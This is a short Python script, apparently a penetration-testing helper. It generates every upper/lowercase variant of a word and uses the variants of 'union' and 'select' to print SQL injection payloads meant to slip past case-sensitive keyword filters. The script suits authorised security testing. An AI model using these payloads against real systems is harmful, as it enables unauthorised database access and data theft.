""""
generate all variations of upper- and lowercase of a word or payload

too lazy to test every upper-/lowercase variant of a command when testing?
SELECT, then SelEct, then SeLeCt, then ... and which variants did I try out again?"
"""

import itertools

def all_variations(word):
    # generate all variations of a word with each letter in either lower or uppercase.
    letter_options = [(char.lower(), char.upper()) for char in word]
    return [''.join(combo) for combo in itertools.product(*letter_options)]

if __name__ == "__main__":
    # case scramble the case of several words in a payload
    data_to_scramble = ["union", "select"]
    m = {data: all_variations(data) for data in data_to_scramble}
    for variation1, variation2 in itertools.product(m["union"], m["select"]):
        payload = f"' {variation1} {variation2} 1, 'some user', 'test string', 1--"
        print(payload)

    # case scramble a single word
    for word in all_variations("select"):
        print(word)